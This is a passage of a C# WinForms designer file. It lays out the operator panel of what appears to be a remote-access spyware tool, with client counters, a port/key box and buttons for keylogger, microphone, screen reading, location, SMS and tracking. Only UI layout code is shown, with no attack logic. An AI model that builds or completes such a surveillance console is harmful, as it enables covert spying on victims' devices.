            // 
            this.activityzpanel.Controls.Add(this.DGVNOTF);
            this.activityzpanel.Controls.Add(this.serverspanel);
            this.activityzpanel.Controls.Add(this.DGVALRTS);
            this.activityzpanel.Dock = System.Windows.Forms.DockStyle.Right;
            this.activityzpanel.FillColor = System.Drawing.Color.Black;
            this.activityzpanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.activityzpanel.ForeColor = System.Drawing.Color.White;
            this.activityzpanel.Location = new System.Drawing.Point(-290, 57);
            this.activityzpanel.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.activityzpanel.Name = "activityzpanel";
            this.activityzpanel.Padding = new System.Windows.Forms.Padding(0, 34, 0, 0);
            this.activityzpanel.Radius = 55;
            this.activityzpanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.activityzpanel.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.activityzpanel.Size = new System.Drawing.Size(477, 51);
            this.activityzpanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.activityzpanel.StyleCustomMode = true;
            this.activityzpanel.TabIndex = 3;
            this.activityzpanel.Text = "Recent Activitys";
            this.activityzpanel.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // DGVNOTF
            // 
            this.DGVNOTF.AllowUserToAddRows = false;
            this.DGVNOTF.AllowUserToDeleteRows = false;
            this.DGVNOTF.AllowUserToResizeColumns = false;
            this.DGVNOTF.AllowUserToResizeRows = false;
            this.DGVNOTF.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGVNOTF.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVNOTF.BackgroundColor = System.Drawing.Color.Black;
            this.DGVNOTF.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.DGVNOTF.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.DGVNOTF.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGVNOTF.ColumnHeadersVisible = false;
            this.DGVNOTF.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.cliimg,
            this.notitext});
            dataGridViewCellStyle17.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle17.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle17.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle17.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle17.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            dataGridViewCellStyle17.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle17.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGVNOTF.DefaultCellStyle = dataGridViewCellStyle17;
            this.DGVNOTF.EnableHeadersVisualStyles = false;
            this.DGVNOTF.Location = new System.Drawing.Point(56, 75);
            this.DGVNOTF.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.DGVNOTF.Name = "DGVNOTF";
            this.DGVNOTF.ReadOnly = true;
            this.DGVNOTF.RowHeadersVisible = false;
            this.DGVNOTF.RowHeadersWidth = 62;
            this.DGVNOTF.RowTemplate.Height = 24;
            this.DGVNOTF.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGVNOTF.Size = new System.Drawing.Size(429, 481);
            this.DGVNOTF.TabIndex = 0;
            // 
            // cliimg
            // 
            this.cliimg.FillWeight = 33.12183F;
            this.cliimg.HeaderText = "image";
            this.cliimg.MinimumWidth = 8;
            this.cliimg.Name = "cliimg";
            this.cliimg.ReadOnly = true;
            // 
            // notitext
            // 
            this.notitext.FillWeight = 111.8782F;
            this.notitext.HeaderText = "notifi";
            this.notitext.MinimumWidth = 8;
            this.notitext.Name = "notitext";
            this.notitext.ReadOnly = true;
            // 
            // serverspanel
            // 
            this.serverspanel.BackColor = System.Drawing.Color.Black;
            this.serverspanel.Controls.Add(this.DashboardPanel);
            this.serverspanel.Controls.Add(this.Panel13);
            this.serverspanel.Controls.Add(this.notifispanel);
            this.serverspanel.Controls.Add(this.Panel7);
            this.serverspanel.Location = new System.Drawing.Point(160, 143);
            this.serverspanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.serverspanel.Name = "serverspanel";
            this.serverspanel.Size = new System.Drawing.Size(227, 235);
            this.serverspanel.TabIndex = 0;
            // 
            // DashboardPanel
            // 
            this.DashboardPanel.Controls.Add(this.MonitorPanel);
            this.DashboardPanel.Controls.Add(this.Panel6);
            this.DashboardPanel.Controls.Add(this.Panel19);
            this.DashboardPanel.Controls.Add(this.Panel4);
            this.DashboardPanel.FillColor = System.Drawing.Color.Black;
            this.DashboardPanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.DashboardPanel.ForeColor = System.Drawing.Color.White;
            this.DashboardPanel.Location = new System.Drawing.Point(2152, 137);
            this.DashboardPanel.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.DashboardPanel.Name = "DashboardPanel";
            this.DashboardPanel.RectColor = System.Drawing.Color.Black;
            this.DashboardPanel.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DashboardPanel.Size = new System.Drawing.Size(188, 255);
            this.DashboardPanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DashboardPanel.StyleCustomMode = true;
            this.DashboardPanel.TabIndex = 0;
            this.DashboardPanel.Text = "Clients";
            this.DashboardPanel.TextAlignment = System.Drawing.ContentAlignment.MiddleRight;
            this.DashboardPanel.TitleColor = System.Drawing.Color.Black;
            this.DashboardPanel.TitleHeight = 0;
            // 
            // MonitorPanel
            // 
            this.MonitorPanel.BackColor = System.Drawing.Color.Black;
            this.MonitorPanel.Controls.Add(this.Panel16);
            this.MonitorPanel.Controls.Add(this.micbtn);
            this.MonitorPanel.Controls.Add(this.screenreadbtn);
            this.MonitorPanel.Controls.Add(this.locationbtn);
            this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon6);
            this.MonitorPanel.Controls.Add(this.Panel20);
            this.MonitorPanel.Controls.Add(this.applicationsbtn);
            this.MonitorPanel.Controls.Add(this.keyloggerbtn);
            this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon5);
            this.MonitorPanel.Controls.Add(this.smsbtn);
            this.MonitorPanel.Location = new System.Drawing.Point(1888, 254);
            this.MonitorPanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.MonitorPanel.Name = "MonitorPanel";
            this.MonitorPanel.Size = new System.Drawing.Size(421, 223);
            this.MonitorPanel.TabIndex = 36;
            this.MonitorPanel.Visible = false;
            // 
            // Panel16
            // 
            this.Panel16.BackColor = System.Drawing.Color.Black;
            this.Panel16.Controls.Add(this.DrakeUIButtonIcon16);
            this.Panel16.Controls.Add(this.DrakeUIButtonIcon14);
            this.Panel16.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel16.Location = new System.Drawing.Point(0, -314);
            this.Panel16.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel16.Name = "Panel16";
            this.Panel16.Size = new System.Drawing.Size(421, 37);
            this.Panel16.TabIndex = 30;
            // 
            // DrakeUIButtonIcon16
            // 
            this.DrakeUIButtonIcon16.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon16.Dock = System.Windows.Forms.DockStyle.Right;
            this.DrakeUIButtonIcon16.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon16.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.DrakeUIButtonIcon16.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon16.Location = new System.Drawing.Point(274, 0);
            this.DrakeUIButtonIcon16.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.DrakeUIButtonIcon16.Name = "DrakeUIButtonIcon16";
            this.DrakeUIButtonIcon16.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon16.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon16.Size = new System.Drawing.Size(147, 37);
            this.DrakeUIButtonIcon16.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon16.StyleCustomMode = true;
            this.DrakeUIButtonIcon16.Symbol = 61979;
            this.DrakeUIButtonIcon16.SymbolSize = 30;
            this.DrakeUIButtonIcon16.TabIndex = 31;
            this.DrakeUIButtonIcon16.Text = "Tracking";
            this.DrakeUIButtonIcon16.Click += new System.EventHandler(this.DrakeUIButtonIcon16_Click);
            // 
            // DrakeUIButtonIcon14
            // 
            this.DrakeUIButtonIcon14.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon14.Dock = System.Windows.Forms.DockStyle.Left;
            this.DrakeUIButtonIcon14.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon14.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.DrakeUIButtonIcon14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon14.Location = new System.Drawing.Point(0, 0);
            this.DrakeUIButtonIcon14.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.DrakeUIButtonIcon14.Name = "DrakeUIButtonIcon14";
            this.DrakeUIButtonIcon14.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon14.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon14.Size = new System.Drawing.Size(147, 37);
            this.DrakeUIButtonIcon14.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon14.StyleCustomMode = true;
            this.DrakeUIButtonIcon14.Symbol = 61549;
            this.DrakeUIButtonIcon14.SymbolSize = 30;
            this.DrakeUIButtonIcon14.TabIndex = 30;
            this.DrakeUIButtonIcon14.Text = "Firewall";
            this.DrakeUIButtonIcon14.Click += new System.EventHandler(this.DrakeUIButtonIcon14_Click_1);
            // 
            // Panel20
            // 
            this.Panel20.Controls.Add(this.FWPANEL);
            this.Panel20.Controls.Add(this.TRKPANEL);
            this.Panel20.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel20.Location = new System.Drawing.Point(0, -277);
            this.Panel20.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel20.Name = "Panel20";
            this.Panel20.Size = new System.Drawing.Size(421, 500);
            this.Panel20.TabIndex = 40;
            // 
            // FWPANEL
            // 
            this.FWPANEL.Controls.Add(this.infotitlepanel);
            this.FWPANEL.Controls.Add(this.Label4);
            this.FWPANEL.Controls.Add(this.DrakeUIAvatar9);
            this.FWPANEL.Controls.Add(this.DrakeUIAvatar5);
            this.FWPANEL.Controls.Add(this.DrakeUIAvatar8);
            this.FWPANEL.Controls.Add(this.FWstatus);
            this.FWPANEL.Controls.Add(this.DGFW);
            this.FWPANEL.Dock = System.Windows.Forms.DockStyle.Fill;
            this.FWPANEL.Location = new System.Drawing.Point(0, 0);
            this.FWPANEL.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.FWPANEL.Name = "FWPANEL";
            this.FWPANEL.Size = new System.Drawing.Size(421, 500);
            this.FWPANEL.TabIndex = 29;
            // 
            // infotitlepanel
            // 
            this.infotitlepanel.Controls.Add(this.infopanel);
            this.infotitlepanel.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(225)))), ((int)(((byte)(245)))), ((int)(((byte)(254)))));
            this.infotitlepanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.infotitlepanel.ForeColor = System.Drawing.Color.White;
            this.infotitlepanel.Location = new System.Drawing.Point(184, 121);
            this.infotitlepanel.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.infotitlepanel.Name = "infotitlepanel";
            this.infotitlepanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.infotitlepanel.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.infotitlepanel.Size = new System.Drawing.Size(317, 169);
            this.infotitlepanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.infotitlepanel.TabIndex = 3;
            this.infotitlepanel.Text = "DashBoard";
            this.infotitlepanel.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.infotitlepanel.TitleHeight = 0;
            // 
            // infopanel
            // 
            this.infopanel.BackColor = System.Drawing.Color.BlanchedAlmond;
            this.infopanel.Controls.Add(this.Panel5);
            this.infopanel.Location = new System.Drawing.Point(1991, 345);
            this.infopanel.Margin = new System.Windows.Forms.Padding(4);
            this.infopanel.Name = "infopanel";
            this.infopanel.Size = new System.Drawing.Size(183, 204);
            this.infopanel.TabIndex = 13;
            // 
            // Panel5
            // 
            this.Panel5.BackColor = System.Drawing.Color.Black;
            this.Panel5.Controls.Add(this.MapPannel);
            this.Panel5.Controls.Add(this.mappanel);
            this.Panel5.Controls.Add(this.Panel2);
            this.Panel5.Location = new System.Drawing.Point(1728, 172);
            this.Panel5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel5.Name = "Panel5";
            this.Panel5.Size = new System.Drawing.Size(235, 262);
            this.Panel5.TabIndex = 6;
            // 
            // MapPannel
            // 
            this.MapPannel.BackColor = System.Drawing.Color.Black;
            this.MapPannel.Location = new System.Drawing.Point(2299, 273);
            this.MapPannel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.MapPannel.Name = "MapPannel";
            this.MapPannel.Size = new System.Drawing.Size(68, 62);
            this.MapPannel.TabIndex = 5;
            // 
            // mappanel
            // 
            this.mappanel.FillColor = System.Drawing.Color.Black;
            this.mappanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.mappanel.ForeColor = System.Drawing.Color.White;
            this.mappanel.Location = new System.Drawing.Point(2220, 276);
            this.mappanel.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.mappanel.Name = "mappanel";
            this.mappanel.Padding = new System.Windows.Forms.Padding(0, 34, 0, 0);
            this.mappanel.Radius = 55;
            this.mappanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.mappanel.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.mappanel.Size = new System.Drawing.Size(55, 57);
            this.mappanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.mappanel.StyleCustomMode = true;
            this.mappanel.TabIndex = 0;
            this.mappanel.Text = null;
            this.mappanel.TitleColor = System.Drawing.Color.Black;
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Black;
            this.Panel2.Controls.Add(this.infobox);
            this.Panel2.Controls.Add(this.ReciveBox);
            this.Panel2.Controls.Add(this.SentBox);
            this.Panel2.Controls.Add(this.RecentBox);
            this.Panel2.Location = new System.Drawing.Point(2260, 134);
            this.Panel2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(107, 134);
            this.Panel2.TabIndex = 5;
            // 
            // infobox
            // 
            this.infobox.Controls.Add(this.infotext);
            this.infobox.Controls.Add(this.DrakeUIAvatar3);
            this.infobox.FillColor = System.Drawing.Color.Black;
            this.infobox.Font = new System.Drawing.Font("Microsoft YaHei", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.infobox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.infobox.Location = new System.Drawing.Point(73, 4);
            this.infobox.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.infobox.Name = "infobox";
            this.infobox.Padding = new System.Windows.Forms.Padding(0, 39, 0, 0);
            this.infobox.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.infobox.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.infobox.Size = new System.Drawing.Size(229, 122);
            this.infobox.Style = DrakeUI.Framework.UIStyle.Custom;
            this.infobox.StyleCustomMode = true;
            this.infobox.TabIndex = 0;
            this.infobox.Text = "Info";
            // 
            // infotext
            // 
            this.infotext.BackColor = System.Drawing.Color.Transparent;
            this.infotext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.infotext.Font = new System.Drawing.Font("Calibri", 15F);
            this.infotext.ForeColor = System.Drawing.Color.White;
            this.infotext.Location = new System.Drawing.Point(0, 39);
            this.infotext.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.infotext.Name = "infotext";
            this.infotext.Size = new System.Drawing.Size(174, 83);
            this.infotext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.infotext.StyleCustomMode = true;
            this.infotext.TabIndex = 11;
            this.infotext.Text = "Online : 0\r\nPort : ....\r\nKey : ....";
            this.infotext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // DrakeUIAvatar3
            // 
            this.DrakeUIAvatar3.AvatarSize = 140;
            this.DrakeUIAvatar3.BackColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar3.Dock = System.Windows.Forms.DockStyle.Right;
            this.DrakeUIAvatar3.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar3.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar3.Location = new System.Drawing.Point(174, 39);
            this.DrakeUIAvatar3.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar3.Name = "DrakeUIAvatar3";
            this.DrakeUIAvatar3.Size = new System.Drawing.Size(55, 83);
            this.DrakeUIAvatar3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar3.StyleCustomMode = true;
            this.DrakeUIAvatar3.Symbol = 62144;
            this.DrakeUIAvatar3.SymbolSize = 64;
            this.DrakeUIAvatar3.TabIndex = 10;
            this.DrakeUIAvatar3.Text = "DrakeUIAvatar3";
            // 
            // ReciveBox
            // 
            this.ReciveBox.Controls.Add(this.recvtotal);
            this.ReciveBox.Controls.Add(this.DrakeUIAvatar6);
            this.ReciveBox.FillColor = System.Drawing.Color.Black;
            this.ReciveBox.Font = new System.Drawing.Font("Microsoft YaHei", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ReciveBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.ReciveBox.Location = new System.Drawing.Point(819, 59);
            this.ReciveBox.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.ReciveBox.Name = "ReciveBox";
            this.ReciveBox.Padding = new System.Windows.Forms.Padding(0, 39, 0, 0);
            this.ReciveBox.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.ReciveBox.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.ReciveBox.Size = new System.Drawing.Size(227, 122);
            this.ReciveBox.Style = DrakeUI.Framework.UIStyle.Custom;
            this.ReciveBox.StyleCustomMode = true;
            this.ReciveBox.TabIndex = 1;
            this.ReciveBox.Text = "Received";
            // 
            // recvtotal
            // 
            this.recvtotal.BackColor = System.Drawing.Color.Transparent;
            this.recvtotal.Dock = System.Windows.Forms.DockStyle.Fill;
            this.recvtotal.Font = new System.Drawing.Font("Calibri", 15F, System.Drawing.FontStyle.Bold);
            this.recvtotal.ForeColor = System.Drawing.Color.White;
            this.recvtotal.Location = new System.Drawing.Point(0, 39);
            this.recvtotal.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.recvtotal.Name = "recvtotal";
            this.recvtotal.Size = new System.Drawing.Size(154, 83);
            this.recvtotal.Style = DrakeUI.Framework.UIStyle.Custom;
            this.recvtotal.StyleCustomMode = true;
            this.recvtotal.TabIndex = 11;
            this.recvtotal.Text = "0 KB";
            this.recvtotal.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // DrakeUIAvatar6
            // 
            this.DrakeUIAvatar6.BackColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar6.Dock = System.Windows.Forms.DockStyle.Right;
            this.DrakeUIAvatar6.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar6.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar6.Location = new System.Drawing.Point(154, 39);
            this.DrakeUIAvatar6.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar6.Name = "DrakeUIAvatar6";
            this.DrakeUIAvatar6.Size = new System.Drawing.Size(73, 83);
            this.DrakeUIAvatar6.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar6.StyleCustomMode = true;
            this.DrakeUIAvatar6.Symbol = 61677;
            this.DrakeUIAvatar6.SymbolSize = 64;
            this.DrakeUIAvatar6.TabIndex = 12;
            this.DrakeUIAvatar6.Text = "DrakeUIAvatar6";
            // 
            // SentBox
            // 
            this.SentBox.Controls.Add(this.senttotal);
            this.SentBox.Controls.Add(this.DrakeUIAvatar7);
            this.SentBox.FillColor = System.Drawing.Color.Black;
            this.SentBox.Font = new System.Drawing.Font("Microsoft YaHei", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SentBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.SentBox.Location = new System.Drawing.Point(467, 59);
            this.SentBox.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.SentBox.Name = "SentBox";
            this.SentBox.Padding = new System.Windows.Forms.Padding(0, 39, 0, 0);
            this.SentBox.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.SentBox.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.SentBox.Size = new System.Drawing.Size(224, 122);
            this.SentBox.Style = DrakeUI.Framework.UIStyle.Custom;
            this.SentBox.StyleCustomMode = true;
            this.SentBox.TabIndex = 2;
            this.SentBox.Text = "Sent";
            // 
            // senttotal
            // 
            this.senttotal.BackColor = System.Drawing.Color.Transparent;
            this.senttotal.Dock = System.Windows.Forms.DockStyle.Fill;
            this.senttotal.Font = new System.Drawing.Font("Calibri", 15F, System.Drawing.FontStyle.Bold);
            this.senttotal.ForeColor = System.Drawing.Color.White;
            this.senttotal.Location = new System.Drawing.Point(0, 39);
            this.senttotal.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.senttotal.Name = "senttotal";
            this.senttotal.Size = new System.Drawing.Size(140, 83);
            this.senttotal.Style = DrakeUI.Framework.UIStyle.Custom;
            this.senttotal.StyleCustomMode = true;
            this.senttotal.TabIndex = 11;
            this.senttotal.Text = "0 KB";
            this.senttotal.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // DrakeUIAvatar7
            // 
            this.DrakeUIAvatar7.BackColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar7.Dock = System.Windows.Forms.DockStyle.Right;
            this.DrakeUIAvatar7.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar7.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar7.Location = new System.Drawing.Point(140, 39);
            this.DrakeUIAvatar7.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar7.Name = "DrakeUIAvatar7";
            this.DrakeUIAvatar7.Size = new System.Drawing.Size(84, 83);
            this.DrakeUIAvatar7.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar7.StyleCustomMode = true;
            this.DrakeUIAvatar7.Symbol = 61678;
            this.DrakeUIAvatar7.SymbolSize = 64;
            this.DrakeUIAvatar7.TabIndex = 13;
            this.DrakeUIAvatar7.Text = "DrakeUIAvatar7";
            // 
            // RecentBox
            // 
            this.RecentBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.RecentBox.Controls.Add(this.lastclienttext);
            this.RecentBox.Controls.Add(this.lastclientpic);
            this.RecentBox.FillColor = System.Drawing.Color.Black;
            this.RecentBox.Font = new System.Drawing.Font("Microsoft YaHei", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.RecentBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.RecentBox.Location = new System.Drawing.Point(-195, 4);
            this.RecentBox.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.RecentBox.Name = "RecentBox";
            this.RecentBox.Padding = new System.Windows.Forms.Padding(0, 39, 0, 0);
            this.RecentBox.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.RecentBox.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.RecentBox.Size = new System.Drawing.Size(253, 122);
            this.RecentBox.Style = DrakeUI.Framework.UIStyle.Custom;
            this.RecentBox.StyleCustomMode = true;
            this.RecentBox.TabIndex = 3;
            this.RecentBox.Text = "Recent";
            // 
            // lastclienttext
            // 
            this.lastclienttext.BackColor = System.Drawing.Color.Transparent;
            this.lastclienttext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.lastclienttext.Font = new System.Drawing.Font("Calibri", 15F, System.Drawing.FontStyle.Bold);
            this.lastclienttext.ForeColor = System.Drawing.Color.White;
            this.lastclienttext.Location = new System.Drawing.Point(0, 39);
            this.lastclienttext.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.lastclienttext.Name = "lastclienttext";
            this.lastclienttext.Size = new System.Drawing.Size(177, 83);
            this.lastclienttext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.lastclienttext.StyleCustomMode = true;
            this.lastclienttext.TabIndex = 11;
            this.lastclienttext.Text = "....\r\n....\r\n....";
            this.lastclienttext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // Label4
            // 
            this.Label4.Location = new System.Drawing.Point(233, 133);
            this.Label4.Name = "Label4";
            this.Label4.Size = new System.Drawing.Size(155, 129);
            this.Label4.TabIndex = 40;
            this.Label4.Text = "Firewall Apps";
            this.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // DGFW
            // 
            this.DGFW.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.DGFW.AllowUserToAddRows = false;
            this.DGFW.AllowUserToDeleteRows = false;
            this.DGFW.AllowUserToResizeColumns = false;
            this.DGFW.AllowUserToResizeRows = false;
            dataGridViewCellStyle18.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle18.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle18.ForeColor = System.Drawing.Color.Cyan;
            dataGridViewCellStyle18.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle18.SelectionForeColor = System.Drawing.Color.Black;
            this.DGFW.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle18;
            this.DGFW.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGFW.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGFW.BackgroundColor = System.Drawing.Color.Black;
